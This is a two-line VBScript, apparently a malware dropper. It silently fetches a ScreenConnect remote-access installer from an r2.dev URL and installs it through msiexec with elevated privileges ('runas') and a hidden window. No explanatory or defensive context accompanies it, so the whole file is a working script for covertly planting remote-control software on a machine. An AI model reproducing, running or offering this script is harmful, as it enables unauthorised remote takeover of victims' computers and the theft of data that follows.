Set oShell = CreateObject("Shell.Application")

oShell.ShellExecute "msiexec.exe", "/i https://pub-034a5ae15a0440b4981e89b3ac427488.r2.dev/ScreenConnect.ClientSetup%20(9).msi", "", "runas", 0

